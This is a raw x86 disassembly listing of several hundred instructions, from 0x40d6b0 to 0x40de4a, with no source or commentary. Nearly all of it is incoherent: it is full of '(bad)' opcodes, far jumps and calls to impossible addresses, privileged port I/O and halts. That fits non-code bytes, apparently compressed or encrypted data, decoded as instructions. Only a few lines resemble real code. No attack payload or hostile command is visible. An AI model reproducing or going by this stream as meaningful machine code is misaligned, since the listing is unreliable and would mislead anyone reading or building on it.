  40d6b0:	addr16 sbb bh,bh
  40d6b3:	inc    eax
  40d6b4:	ficom  WORD PTR [ebp-0x715fe703]
  40d6ba:	xor    cl,cl
  40d6bc:	pop    edx
  40d6bd:	and    bl,BYTE PTR [esi]
  40d6bf:	jnp    0x40d651
  40d6c1:	sub    DWORD PTR [esi-0x5b34d4f4],edi
  40d6c7:	frstor [edx+0x5bbaf864]
  40d6ce:	sub    bl,ch
  40d6d0:	or     eax,0x7ddc47d7
  40d6d5:	stc    
  40d6d6:	jb     0x40d74c
  40d6d8:	rcr    BYTE PTR [eax+edx*8-0x3578b5e7],cl
  40d6df:	mov    ebp,0x427c5056
  40d6e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6e5:	aaa    
  40d6e6:	cs ret 0x8a0
  40d6ea:	cmp    ebp,DWORD PTR [edi]
  40d6ec:	sbb    al,0xff
  40d6ee:	ret    
  40d6ef:	and    DWORD PTR [eax],esp
  40d6f1:	jno    0x40d73b
  40d6f3:	mov    esp,0x401930a0
  40d6f8:	mov    ecx,0xe2823de5
  40d6fd:	(bad)  
  40d6fe:	cmp    eax,DWORD PTR [edx]
  40d700:	or     cl,BYTE PTR [edx-0x530658e8]
  40d706:	sbb    BYTE PTR [ecx-0x4043ef0c],al
  40d70c:	in     al,dx
  40d70d:	out    0x27,al
  40d70f:	test   al,0x2
  40d711:	std    
  40d712:	add    BYTE PTR [ebx-0xdfbccf3],ch
  40d718:	mov    cl,0x76
  40d71a:	ret    
  40d71b:	sti    
  40d71c:	scas   al,BYTE PTR es:[edi]
  40d71d:	sbb    BYTE PTR [esi],bh
  40d71f:	cmp    edi,esi
  40d721:	adc    DWORD PTR [edi+0x76],eax
  40d724:	mov    dl,0x6
  40d726:	ret    
  40d727:	inc    esi
  40d728:	outs   dx,DWORD PTR ds:[esi]
  40d729:	out    dx,eax
  40d72a:	cli    
  40d72b:	sar    BYTE PTR [eax],cl
  40d72d:	inc    ebp
  40d72e:	xchg   esp,eax
  40d72f:	sbb    DWORD PTR [esi+0x75861bdb],esp
  40d735:	jmp    0x40d6fc
  40d737:	sub    al,0xff
  40d739:	xchg   BYTE PTR [esi-0x10e48b4f],bh
  40d73f:	jmp    0x2789:0xd848b15e
  40d746:	icebp  
  40d747:	stos   BYTE PTR es:[edi],al
  40d748:	and    al,0x3a
  40d74a:	mov    ch,0xb8
  40d74c:	add    al,0xc1
  40d74e:	hlt    
  40d74f:	inc    edx
  40d750:	mov    BYTE PTR [edi+eiz*4+0xb57555a],al
  40d757:	in     al,dx
  40d758:	inc    esp
  40d759:	test   cl,ah
  40d75b:	test   eax,0x576273e9
  40d760:	retf   
  40d761:	call   0x818dee60
  40d766:	or     BYTE PTR [ebx],dh
  40d768:	sbb    DWORD PTR [ecx+0x4dd9bda5],ecx
  40d76e:	xor    cl,al
  40d770:	inc    esi
  40d771:	xchg   ebx,eax
  40d772:	cdq    
  40d773:	mov    ch,0xde
  40d775:	retf   0x24e3
  40d778:	shl    bh,1
  40d77a:	push   ebp
  40d77b:	das    
  40d77c:	jle    0x40d724
  40d77e:	lahf   
  40d77f:	cmp    cl,dl
  40d781:	sti    
  40d782:	jmp    DWORD PTR [edi-0x6c]
  40d785:	imul   ebp,DWORD PTR [edi-0x7f],0x25
  40d789:	dec    edx
  40d78a:	aas    
  40d78b:	and    al,0x7
  40d78d:	sbb    DWORD PTR [eax],0x4895d77c
  40d793:	add    eax,DWORD PTR [edi+0x5]
  40d796:	cmc    
  40d797:	enter  0x1a16,0x37
  40d79b:	loopne 0x40d732
  40d79d:	add    ecx,DWORD PTR [edi]
  40d79f:	jl     0x9903d83e
  40d7a5:	outs   dx,DWORD PTR ds:[esi]
  40d7a6:	fcom   QWORD PTR [ecx]
  40d7a8:	xor    dh,BYTE PTR ds:0x41d7de73
  40d7ae:	mov    ah,0x4
  40d7b1:	sub    BYTE PTR fs:[edi],dl
  40d7b4:	fisub  DWORD PTR [eax+ecx*1+0x5797add5]
  40d7bb:	lods   eax,DWORD PTR ds:[esi]
  40d7bc:	popf   
  40d7bd:	test   DWORD PTR [ebx+0x64],edx
  40d7c0:	cmpordps xmm7,XMMWORD PTR [ecx-0xe]
  40d7c5:	retf   
  40d7c6:	sbb    BYTE PTR [edx],al
  40d7c8:	shl    BYTE PTR [eax-0x2f0376e1],cl
  40d7ce:	and    eax,0x1ab86b98
  40d7d3:	mov    ds:0xa4bce315,eax
  40d7d8:	enter  0x2d3,0x3e
  40d7dc:	repnz mov eax,0x9e9f0d2
  40d7e2:	xor    ebp,DWORD PTR [edi+0x2f8020b0]
  40d7e8:	adc    eax,0x147b3198
  40d7ed:	add    eax,0x128ea97e
  40d7f2:	dec    esi
  40d7f3:	int3   
  40d7f4:	and    bl,bl
  40d7f6:	fisubr DWORD PTR [edx]
  40d7f8:	test   DWORD PTR [ebx-0x35471afb],0x7eacae0e
  40d802:	xor    eax,0x21be331a
  40d807:	xor    eax,0x1ac07087
  40d80c:	add    eax,0x74ab00f3
  40d811:	xchg   edx,eax
  40d812:	push   ds
  40d813:	test   DWORD PTR [edi+eax*2],ecx
  40d816:	jp     0x40d885
  40d818:	push   ebx
  40d819:	mov    dh,0xbf
  40d81b:	popa   
  40d81c:	out    0xc0,eax
  40d81e:	mov    dl,0x47
  40d820:	mov    bl,0x8d
  40d822:	loop   0x40d7f9
  40d824:	or     esi,DWORD PTR [edi]
  40d826:	nop
  40d827:	jno    0x40d834
  40d829:	add    BYTE PTR [ebp-0x5c],cl
  40d82c:	jecxz  0x40d82c
  40d82e:	xchg   edi,eax
  40d82f:	xchg   ebp,eax
  40d830:	pop    esi
  40d831:	push   ebp
  40d832:	push   esi
  40d833:	xchg   ebx,eax
  40d834:	addr16 mov dl,0x53
  40d838:	mov    cl,al
  40d83a:	pop    ss
  40d83b:	push   ebp
  40d83c:	jle    0x40d810
  40d83e:	pop    edx
  40d83f:	pop    edx
  40d840:	rcl    BYTE PTR [esi+ebp*2-0x393b3195],0x14
  40d848:	fwait
  40d849:	hlt    
  40d84a:	push   ss
  40d84b:	rol    ebx,1
  40d84d:	dec    edi
  40d84e:	mov    eax,0x3af0ab30
  40d853:	lea    esi,[ebx+0x50]
  40d856:	into   
  40d857:	push   ecx
  40d858:	xchg   DWORD PTR [edx+0x19da2c7e],esi
  40d85e:	mov    esi,0xc9a73c4d
  40d863:	mov    bl,0x33
  40d865:	push   ds
  40d866:	mov    al,ds:0xcf4cefb9
  40d86b:	adc    bh,BYTE PTR [eax+0x69734bbc]
  40d871:	sub    ebx,DWORD PTR [ebp+edx*2-0x68]
  40d875:	ds mov bh,0x50
  40d878:	popa   
  40d879:	call   esp
  40d87b:	fdivrp st(1),st
  40d87d:	inc    edx
  40d87e:	add    DWORD PTR [esi+esi*1+0x30fb84],edx
  40d885:	fs push cs
  40d887:	dec    ebx
  40d888:	jb     0x40d852
  40d88a:	add    ah,bh
  40d88c:	pop    esi
  40d88d:	adc    BYTE PTR [edi+eiz*8+0x69e61474],bh
  40d894:	cmp    al,0xcb
  40d896:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d897:	push   0xe7b371e2
  40d89c:	imul   edx,esp,0x8d84b6a5
  40d8a2:	sub    DWORD PTR [edi],0x8540a0b2
  40d8a8:	xor    DWORD PTR [ebx-0x2],0xe1bdf771
  40d8af:	sub    esp,ecx
  40d8b1:	xchg   ebp,eax
  40d8b2:	pop    ecx
  40d8b3:	imul   eax,DWORD PTR gs:[ebp+0x426128c9],0x14
  40d8bb:	rcr    BYTE PTR [ecx],1
  40d8bd:	not    DWORD PTR [edi-0x6ab7fd6]
  40d8c3:	inc    edx
  40d8c4:	lods   eax,DWORD PTR ds:[esi]
  40d8c5:	cmp    dh,dl
  40d8c7:	in     al,dx
  40d8c8:	add    eax,0xf704e335
  40d8cd:	enter  0x3fe8,0xa0
  40d8d1:	add    al,0xe0
  40d8d3:	enter  0x7082,0x93
  40d8d7:	into   
  40d8d8:	or     DWORD PTR [eax+0x7],esp
  40d8db:	ja     0x40d90b
  40d8dd:	pop    edi
  40d8de:	or     al,0xd5
  40d8e0:	push   ebx
  40d8e1:	xor    BYTE PTR [eax],dl
  40d8e3:	aam    0xd4
  40d8e5:	std    
  40d8e6:	dec    edx
  40d8e7:	dec    BYTE PTR [eax]
  40d8e9:	and    ch,BYTE PTR [eax-0x29b7d6a9]
  40d8ef:	xchg   esp,eax
  40d8f0:	and    DWORD PTR [edi-0x2a58d895],esp
  40d8f6:	ins    DWORD PTR es:[edi],dx
  40d8f7:	dec    esi
  40d8f8:	push   ebx
  40d8f9:	adc    dh,BYTE PTR [ebx-0x4b]
  40d8fc:	scas   al,BYTE PTR es:[edi]
  40d8fd:	mov    edi,0xc3bbd3ee
  40d902:	popa   
  40d903:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d904:	gs addr16 loopne 0x40d8eb
  40d908:	sar    BYTE PTR [eax+ebp*1-0x53],1
  40d90c:	sub    eax,0x5dbe113
  40d911:	aaa    
  40d912:	call   edi
  40d914:	sbb    al,0x76
  40d916:	xchg   ebp,eax
  40d917:	loope  0x40d950
  40d919:	(bad)  
  40d91a:	adc    edi,edi
  40d91c:	scas   al,BYTE PTR es:[edi]
  40d91d:	shl    BYTE PTR [eax-0x1b43d16b],0x2f
  40d924:	add    BYTE PTR [edx+0x5037253c],0x2c
  40d92b:	pushf  
  40d92c:	mov    bl,0x3d
  40d92e:	dec    edi
  40d92f:	add    eax,0xd1045b39
  40d934:	sbb    bl,BYTE PTR [edx]
  40d936:	(bad)  
  40d937:	fcmovne st,st(6)
  40d939:	ret    
  40d93a:	or     eax,DWORD PTR ds:0x513d9405
  40d940:	das    
  40d941:	cdq    
  40d942:	dec    ebp
  40d943:	mov    ecx,0x836945ab
  40d948:	(bad)  
  40d949:	jmp    0x40d90e
  40d94b:	xor    al,al
  40d94d:	mov    bl,0xde
  40d94f:	jmp    0x4ee2e52b
  40d954:	je     0x40d90d
  40d956:	aaa    
  40d957:	out    dx,al
  40d958:	dec    ebp
  40d959:	inc    esi
  40d95a:	sbb    al,0x12
  40d95c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d95d:	dec    esp
  40d95e:	mov    ah,0xf4
  40d960:	and    DWORD PTR [ecx+0x73],esp
  40d963:	leave  
  40d964:	(bad)  
  40d965:	pop    edi
  40d966:	(bad)  
  40d967:	rcr    DWORD PTR [edx-0x5b],1
  40d96a:	push   0xcdefad5c
  40d96f:	fdiv   QWORD PTR [esi]
  40d971:	jae    0x40d9e0
  40d973:	aad    0x4d
  40d975:	push   cs
  40d976:	daa    
  40d977:	push   es
  40d978:	int    0x52
  40d97a:	jmp    0x40d96c
  40d97c:	cld    
  40d97d:	inc    esp
  40d97e:	mov    eax,ds:0x8c1a2f03
  40d983:	fadd   st,st(5)
  40d985:	in     eax,dx
  40d986:	xor    eax,0x7fffee2e
  40d98b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d98c:	mov    dl,BYTE PTR [ebx]
  40d98e:	jmp    0xb42f:0xe2efaa1
  40d995:	push   es
  40d996:	pusha  
  40d997:	fmul   DWORD PTR [ecx]
  40d999:	mov    bl,BYTE PTR [ecx-0x22]
  40d99c:	(bad)  
  40d99d:	pop    ds
  40d99e:	push   ebp
  40d99f:	fdiv   DWORD PTR [edi-0x4519c0b7]
  40d9a5:	bound  eax,QWORD PTR [edx+0x3d]
  40d9a8:	inc    ebx
  40d9a9:	mov    ch,dh
  40d9ab:	pop    ss
  40d9ac:	ja     0x40da27
  40d9ae:	enter  0x4e0a,0xe5
  40d9b2:	inc    esi
  40d9b3:	jp     0x40d98b
  40d9b5:	jecxz  0x40d992
  40d9b7:	mov    eax,0x7317180c
  40d9bc:	dec    ebx
  40d9bd:	mov    eax,ds:0xb8fb4252
  40d9c2:	xchg   edi,eax
  40d9c3:	(bad)  
  40d9c4:	aaa    
  40d9c5:	xor    eax,0x6daf9434
  40d9ca:	add    eax,0xde224f51
  40d9cf:	call   0x4c7f:0xf4308250
  40d9d6:	adc    BYTE PTR [edx+0x49413df],0x21
  40d9dd:	cmp    eax,eax
  40d9df:	sub    DWORD PTR [ecx],ebx
  40d9e1:	xchg   BYTE PTR [ecx+esi*8-0x3b],bh
  40d9e5:	fcom   QWORD PTR [ebx+ebp*1+0x5d17982e]
  40d9ec:	cwd    
  40d9ee:	or     DWORD PTR [esi-0x28],eax
  40d9f1:	retf   0xa2a4
  40d9f4:	nop
  40d9f5:	push   ecx
  40d9f6:	ja     0x40da35
  40d9f8:	sbb    esi,DWORD PTR [edi+eiz*8-0x2ffca068]
  40d9ff:	fdivrp st(5),st
  40da01:	stos   DWORD PTR es:[edi],eax
  40da02:	call   DWORD PTR [eax]
  40da04:	sub    ebp,DWORD PTR [ebx-0x13]
  40da07:	sbb    eax,0xa9cc3e5
  40da0c:	sub    BYTE PTR [ebx-0x2d],0xca
  40da10:	add    al,0x37
  40da12:	sbb    eax,0x1fa246db
  40da17:	and    DWORD PTR [ebp+ebx*8+0x1036bed8],esi
  40da1e:	std    
  40da1f:	test   al,0xe6
  40da21:	pop    es
  40da22:	sub    ebp,DWORD PTR [edi+0x71]
  40da25:	mov    cs,WORD PTR [eax+0x2932e62f]
  40da2b:	das    
  40da2c:	sub    eax,0xffffffaf
  40da2f:	inc    edi
  40da30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da31:	or     eax,0x29cd64a9
  40da36:	pop    edx
  40da37:	or     bh,dh
  40da39:	or     BYTE PTR [edi-0x53848a22],al
  40da3f:	data16 mov bh,0xaf
  40da42:	icebp  
  40da43:	leave  
  40da44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da45:	or     DWORD PTR [ebx-0x28b6f4e9],edi
  40da4b:	push   0xffffffa6
  40da4d:	pop    edx
  40da4e:	xor    edi,eax
  40da50:	add    edx,edi
  40da52:	mov    edi,DWORD PTR [ebp-0x8]
  40da55:	lea    edx,[edx+edi*1+0x327299]
  40da5c:	jmp    0x40de73
  40da61:	outs   dx,BYTE PTR ds:[esi]
  40da62:	xlat   BYTE PTR ds:[ebx]
  40da63:	shl    BYTE PTR [ebp-0x228e4a8d],cl
  40da69:	mov    dh,0x68
  40da6b:	pop    ss
  40da6c:	out    0xd,eax
  40da6e:	mov    al,0x2f
  40da70:	repnz xor ah,BYTE PTR [edx+0x79707e7e]
  40da77:	jle    0x40daf7
  40da79:	cmp    eax,0x47241320
  40da7e:	sub    al,0x2c
  40da80:	adc    BYTE PTR [esi],0x7d
  40da83:	cld    
  40da84:	setae  BYTE PTR [ebx+0x43]
  40da88:	mov    ah,0xa8
  40da8a:	add    BYTE PTR [ebp+0x78],ah
  40da8d:	and    ah,dl
  40da8f:	mov    dh,0xeb
  40da91:	xor    BYTE PTR [esi-0x5ff5760e],0x3b
  40da98:	adc    ecx,DWORD PTR [esi+0x7a5f4879]
  40da9e:	cwde   
  40da9f:	rcr    BYTE PTR [eax+0x418d841e],1
  40daa5:	sub    bl,BYTE PTR [ebx*1-0x452de12f]
  40daac:	mov    al,0xd4
  40daae:	push   ss
  40daaf:	sbb    dl,BYTE PTR [ebx+edi*1]
  40dab2:	mov    ebp,0xe40cef25
  40dab7:	push   ebx
  40dab8:	sub    al,0x4e
  40daba:	test   al,0xb6
  40dabc:	(bad)  [ebp-0x52]
  40dabf:	sbb    BYTE PTR [ebx+ebx*8],ch
  40dac2:	pop    es
  40dac3:	push   0x58d3084
  40dac8:	push   esp
  40dac9:	cmp    eax,ecx
  40dacb:	push   edx
  40dacc:	xchg   ebx,eax
  40dacd:	iret   
  40dace:	(bad)  
  40dacf:	bnd je 0x40db27
  40dad2:	jns    0x40db1f
  40dad4:	and    DWORD PTR [eax+0x4fcfe181],edx
  40dada:	add    al,0x2a
  40dadc:	iret   
  40dadd:	push   ebp
  40dade:	mov    ch,0x6
  40dae0:	inc    ebx
  40dae1:	or     esp,DWORD PTR es:[ecx-0x22]
  40dae5:	xchg   BYTE PTR [edx+0x6616aff3],bh
  40daeb:	aaa    
  40daec:	sbb    ecx,DWORD PTR [eax+0x7b85c203]
  40daf2:	push   ss
  40daf3:	sub    BYTE PTR [edi+0x19],0xfa
  40daf7:	mov    al,ds:0x73019c11
  40dafc:	jnp    0x40db4e
  40dafe:	in     al,0x54
  40db00:	icebp  
  40db01:	pop    edi
  40db02:	cld    
  40db03:	jmp    0xfef6:0x92a0feed
  40db0a:	xchg   esp,eax
  40db0b:	icebp  
  40db0c:	sub    esp,DWORD PTR [edi]
  40db0e:	(bad)  
  40db0f:	mov    edi,0xfdc57cf3
  40db14:	xchg   DWORD PTR [edi-0x1c],ebp
  40db17:	xchg   ebx,eax
  40db18:	adc    eax,ebp
  40db1a:	sar    DWORD PTR [ebx-0x24],cl
  40db1d:	shl    esi,0x6f
  40db20:	or     BYTE PTR [edi],ch
  40db22:	add    al,0xac
  40db24:	lds    ebx,FWORD PTR [ecx]
  40db26:	mov    edi,0xad9bec56
  40db2b:	mov    ebp,0x6cf8eee2
  40db30:	daa    
  40db31:	push   ebp
  40db32:	out    0xb1,al
  40db34:	push   0xdf3203d6
  40db39:	jae    0x40dae0
  40db3b:	xlat   BYTE PTR ds:[ebx]
  40db3c:	dec    esi
  40db3d:	cmp    DWORD PTR [esi-0x20],ebx
  40db40:	loop   0x40dbb9
  40db42:	push   esp
  40db43:	add    edi,esi
  40db45:	add    al,0xd4
  40db47:	inc    ecx
  40db48:	nop
  40db49:	outs   dx,DWORD PTR ds:[esi]
  40db4a:	andnps xmm7,XMMWORD PTR [ecx+eiz*4+0x7319bdf4]
  40db52:	add    dh,BYTE PTR [edx-0xb89b33a]
  40db58:	xchg   DWORD PTR [ebx-0x3eb046c5],edx
  40db5e:	add    DWORD PTR [ebp-0x696f62f3],esi
  40db64:	scas   eax,DWORD PTR es:[edi]
  40db65:	push   ebx
  40db66:	mov    ch,0xb9
  40db68:	push   esi
  40db69:	add    DWORD PTR [ebx+0x72],esp
  40db6c:	jns    0x40db41
  40db6e:	imul   edx,DWORD PTR [edx+0x462e6d03],0x23
  40db75:	arpl   cx,si
  40db77:	mov    edx,0xa9cfc00b
  40db7c:	(bad)  
  40db7d:	(bad)  
  40db7e:	mov    esp,0x96dbe087
  40db83:	jne    0x40dbb1
  40db85:	mov    ?,eax
  40db87:	sbb    eax,0xf37faaea
  40db8c:	dec    ebx
  40db8d:	repz add ebp,edx
  40db90:	pop    esp
  40db91:	mov    esp,0x8fbfa2e9
  40db96:	add    cl,ah
  40db98:	mov    eax,0xd9865fe5
  40db9d:	jg     0x40db6f
  40db9f:	cld    
  40dba0:	lahf   
  40dba1:	jecxz  0x40db9d
  40dba3:	cdq    
  40dba4:	dec    ebx
  40dba5:	test   BYTE PTR [eax],0xe
  40dba8:	sub    ecx,DWORD PTR [edi-0x3c7b28d7]
  40dbae:	mov    ebp,0xe69a19d5
  40dbb3:	out    0x1,eax
  40dbb5:	mov    ecx,0xbbef7aa1
  40dbba:	out    dx,al
  40dbbb:	ja     0x40db4f
  40dbbd:	(bad)  
  40dbbe:	call   0xe92066ef
  40dbc3:	jne    0x40db56
  40dbc5:	iret   
  40dbc6:	aas    
  40dbc7:	out    0x54,eax
  40dbc9:	out    0xfe,eax
  40dbcb:	inc    ecx
  40dbcc:	inc    eax
  40dbcd:	out    0xad,al
  40dbcf:	call   0x9e28487f
  40dbd4:	push   ecx
  40dbd5:	sbb    esi,ebx
  40dbd7:	mov    eax,DWORD PTR [ebp+0x10a90755]
  40dbdd:	push   esi
  40dbde:	sbb    eax,0x3a5ad5e6
  40dbe3:	int    0x70
  40dbe5:	xor    esi,DWORD PTR [edi+0x59cd2697]
  40dbeb:	test   DWORD PTR [ebx],esi
  40dbed:	sub    al,0xce
  40dbef:	jl     0x40dc4d
  40dbf1:	xchg   DWORD PTR ds:0x2499edf0,edx
  40dbf7:	out    0xbc,eax
  40dbf9:	dec    eax
  40dbfa:	adc    al,0xd6
  40dbfc:	mov    esi,0xab0c3369
  40dc01:	dec    DWORD PTR [ecx]
  40dc03:	pand   mm1,QWORD PTR [ecx]
  40dc06:	push   cs
  40dc07:	mov    BYTE PTR [ecx],bh
  40dc09:	and    eax,0xf8d89244
  40dc0e:	test   BYTE PTR [eiz*2+0x17eb8cc3],bl
  40dc15:	mov    ch,BYTE PTR [edi-0x6d39266f]
  40dc1b:	into   
  40dc1c:	repz xor esi,DWORD PTR fs:[ecx+ecx*1-0x504ca51e]
  40dc25:	lods   eax,DWORD PTR ds:[esi]
  40dc26:	ror    BYTE PTR [eax-0x14],0xa1
  40dc2a:	and    ah,bl
  40dc2c:	mov    ecx,ds
  40dc2e:	dec    ebx
  40dc2f:	pop    esp
  40dc30:	mov    bh,0xfe
  40dc32:	cmova  esi,DWORD PTR [edi-0x3f9baba5]
  40dc39:	adc    edi,DWORD PTR cs:[eax+ebp*2-0x68f203c8]
  40dc41:	sbb    ah,cl
  40dc43:	push   ebx
  40dc44:	pop    ss
  40dc45:	or     al,0x7e
  40dc47:	sub    ah,BYTE PTR [eax]
  40dc49:	or     BYTE PTR [ecx+0x67],bh
  40dc4c:	loop   0x40dc1a
  40dc4e:	pop    ebp
  40dc4f:	jbe    0x40dc4e
  40dc51:	clc    
  40dc52:	cmp    ebx,esi
  40dc54:	aad    0xcc
  40dc56:	and    ebx,DWORD PTR [ebx]
  40dc58:	mov    esp,0x1ed518b5
  40dc5d:	popf   
  40dc5e:	mov    ?,WORD PTR [edi+edi*8]
  40dc61:	mov    esi,0xa7681d44
  40dc66:	cmp    DWORD PTR [eax-0x3d],eax
  40dc69:	adc    DWORD PTR [eax-0x38],edi
  40dc6c:	jecxz  0x40dc6b
  40dc6e:	cmp    ecx,0xffffff9a
  40dc71:	fidiv  WORD PTR [esi+eax*8]
  40dc74:	sub    DWORD PTR [edx],0x89add630
  40dc7a:	jp     0x40dcb9
  40dc7c:	cmp    ch,BYTE PTR [eax-0xd]
  40dc7f:	jl     0x40dc62
  40dc81:	dec    esi
  40dc82:	psubq  mm2,QWORD PTR [esi+0x68e55bea]
  40dc89:	push   edi
  40dc8a:	xchg   edx,eax
  40dc8b:	ds add bh,al
  40dc8e:	adc    BYTE PTR [eax-0x31],0xd2
  40dc92:	mov    al,0x1d
  40dc94:	pop    ebx
  40dc95:	mov    ecx,0xcc975f00
  40dc9a:	mov    al,ds:0xcabfbe54
  40dc9f:	cmp    bl,BYTE PTR [eax+0x59]
  40dca2:	ins    BYTE PTR es:[edi],dx
  40dca3:	or     al,0x18
  40dca5:	retf   
  40dca6:	repnz outs dx,BYTE PTR ds:[esi]
  40dca8:	inc    ecx
  40dca9:	daa    
  40dcaa:	inc    ebp
  40dcab:	inc    ebp
  40dcac:	hlt    
  40dcad:	jecxz  0x40dcbb
  40dcaf:	fs push edi
  40dcb1:	scas   eax,DWORD PTR es:[edi]
  40dcb2:	cmp    eax,0x3a960de6
  40dcb7:	xor    BYTE PTR [eax],0x53
  40dcba:	push   cs
  40dcbb:	cld    
  40dcbc:	(bad)  
  40dcbd:	jb     0x40dcb7
  40dcbf:	push   ebp
  40dcc0:	dec    edx
  40dcc1:	xor    DWORD PTR [ebp-0xdcc05d9],ebp
  40dcc7:	dec    esp
  40dcc8:	sahf   
  40dcc9:	jmp    0xe08e9a10
  40dcce:	push   ecx
  40dccf:	pop    ds
  40dcd0:	cdq    
  40dcd1:	xchg   DWORD PTR [edx],edi
  40dcd3:	push   ss
  40dcd4:	mov    ds:0x3e14a850,al
  40dcd9:	aad    0x86
  40dcdb:	loopne 0x40dc98
  40dcdd:	cmp    al,0xca
  40dcdf:	jp     0x40dcd3
  40dce1:	add    bh,BYTE PTR [ecx+0x76]
  40dce4:	out    0x43,eax
  40dce6:	ins    DWORD PTR es:[edi],dx
  40dce7:	and    DWORD PTR [eax+0x54],esi
  40dcea:	cmp    DWORD PTR [ebx-0x2c074975],edx
  40dcf0:	adc    BYTE PTR [ebx+0x3a571e2e],ah
  40dcf6:	stos   DWORD PTR es:[edi],eax
  40dcf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcf8:	imul   ecx,DWORD PTR [eax-0x55],0xffffffdd
  40dcfc:	mov    eax,0x39ef76ab
  40dd01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd02:	jg     0x40dc91
  40dd04:	mov    bl,0xb6
  40dd06:	xor    esi,edi
  40dd08:	scas   eax,DWORD PTR es:[edi]
  40dd09:	pop    eax
  40dd0a:	xor    ebp,DWORD PTR [ecx+ebx*2]
  40dd0d:	add    edx,DWORD PTR [eax-0x34adad50]
  40dd13:	mov    ebx,0x7ac680b9
  40dd18:	dec    esi
  40dd19:	mov    ah,0xd
  40dd1b:	out    0x10,al
  40dd1d:	sti    
  40dd1e:	push   ecx
  40dd1f:	fcmove st,st(1)
  40dd21:	fucomi st,st(4)
  40dd23:	ds push ebp
  40dd25:	add    DWORD PTR [esi],ebx
  40dd27:	lods   eax,DWORD PTR ds:[esi]
  40dd28:	into   
  40dd29:	or     DWORD PTR [esi+edx*2],ecx
  40dd2c:	enter  0x2e69,0xa3
  40dd30:	cdq    
  40dd31:	scas   eax,DWORD PTR es:[edi]
  40dd32:	push   esi
  40dd33:	outs   dx,BYTE PTR ds:[esi]
  40dd34:	xchg   ebp,eax
  40dd35:	xor    ebp,eax
  40dd37:	sbb    ebp,DWORD PTR [esi-0x38]
  40dd3a:	inc    esp
  40dd3b:	jl     0x40dd1e
  40dd3d:	ds push cs
  40dd3f:	icebp  
  40dd40:	loop   0x40ddb4
  40dd42:	idiv   DWORD PTR [edi]
  40dd44:	sub    al,0xdd
  40dd46:	cmp    eax,0xcdcdbc96
  40dd4b:	imul   eax,DWORD PTR [edx-0x7d2a0c04],0x523a2cff
  40dd55:	push   esi
  40dd56:	jmp    0x60386ce1
  40dd5b:	cli    
  40dd5c:	jmp    0x5197e234
  40dd61:	rol    DWORD PTR cs:[ecx+0x49febd09],0x16
  40dd69:	add    edi,DWORD PTR [edx+eiz*1]
  40dd6c:	mov    ebx,0xb909b2d0
  40dd71:	adc    al,0x13
  40dd73:	jae    0x40ddb7
  40dd75:	into   
  40dd76:	imul   esi,edx,0x50
  40dd79:	mov    ds:0xbe7267ed,al
  40dd7e:	in     al,0x41
  40dd80:	inc    eax
  40dd81:	lods   eax,DWORD PTR ds:[esi]
  40dd82:	dec    edx
  40dd83:	pop    ecx
  40dd84:	ja     0x40ddc5
  40dd86:	sbb    ecx,DWORD PTR [esi]
  40dd88:	inc    ebp
  40dd89:	jae    0x40dd83
  40dd8b:	sub    bl,0x84
  40dd8e:	in     al,dx
  40dd8f:	mov    bh,0x95
  40dd91:	pop    es
  40dd92:	in     eax,dx
  40dd93:	mov    esp,DWORD PTR [ecx+0x7b7a0aa4]
  40dd99:	cwde   
  40dd9a:	xchg   ebx,eax
  40dd9b:	rep lods eax,DWORD PTR ds:[esi]
  40dd9d:	js     0x40dd59
  40dd9f:	shr    dl,1
  40dda1:	mov    DWORD PTR [ebp-0x5c],ebp
  40dda4:	sub    al,0x24
  40dda6:	push   0x5c42bd6b
  40ddab:	sub    ah,BYTE PTR [esp+edi*4+0x75bca834]
  40ddb2:	and    al,0xbf
  40ddb4:	dec    ebp
  40ddb5:	pusha  
  40ddb6:	mov    edx,0x5d6aca43
  40ddbb:	mov    esi,0x2eb78f09
  40ddc0:	and    DWORD PTR [edi-0x67],esi
  40ddc3:	push   edi
  40ddc4:	add    dh,BYTE PTR [ebp+0x14]
  40ddc7:	sbb    eax,0x9e66272c
  40ddcc:	dec    esp
  40ddcd:	jge    0x40de18
  40ddcf:	dec    ecx
  40ddd0:	jmp    0xebd9:0x1fea0b28
  40ddd7:	fild   QWORD PTR [esi]
  40ddd9:	int3   
  40ddda:	mov    ebp,0xb369d835
  40dddf:	rol    BYTE PTR [edx+0x39],0xbc
  40dde3:	sbb    esp,DWORD PTR [ebx]
  40dde5:	(bad)  
  40dde6:	mov    ah,0xbd
  40dde8:	dec    edi
  40dde9:	dec    esi
  40ddea:	sbb    al,0xab
  40ddec:	cmp    DWORD PTR [esi-0x39],esi
  40ddef:	mov    ds:0x6f40f9a,al
  40ddf4:	adc    dl,BYTE PTR [esi]
  40ddf6:	dec    esi
  40ddf7:	inc    ecx
  40ddf8:	ins    DWORD PTR es:[edi],dx
  40ddf9:	dec    edx
  40ddfa:	out    0x25,al
  40ddfc:	ds jno 0x40dde3
  40ddff:	or     bl,BYTE PTR [eax+0x6a]
  40de02:	es xchg edi,eax
  40de04:	and    edi,DWORD PTR [edi-0x79]
  40de07:	call   0xc5c6dd9d
  40de0c:	push   ds
  40de0d:	retf   0x8e93
  40de10:	mov    esi,0xf63396d
  40de15:	jb     0x40ddec
  40de17:	es loope 0x40de00
  40de1a:	dec    ecx
  40de1b:	ror    bl,cl
  40de1d:	sbb    eax,DWORD PTR [eax-0xf]
  40de20:	scas   al,BYTE PTR es:[edi]
  40de21:	aam    0xf2
  40de23:	pop    esp
  40de24:	xor    edi,DWORD PTR [edx]
  40de26:	pop    edx
  40de27:	mov    ah,0xee
  40de29:	adc    eax,0x76c64c52
  40de2e:	add    si,WORD PTR [esi+edx*8+0x1a1df05]
  40de36:	(bad)  
  40de37:	fimul  DWORD PTR [ebx]
  40de39:	stc    
  40de3a:	gs std 
  40de3c:	xchg   edx,eax
  40de3d:	push   0xffffff9c
  40de3f:	or     al,0x83
  40de41:	push   esp
  40de42:	adc    edx,DWORD PTR [ecx]
  40de44:	dec    edx
  40de45:	cmp    al,cl
  40de47:	pop    esp
  40de48:	lods   eax,DWORD PTR ds:[esi]
  40de49:	cmc    
  40de4a:	pop    edi
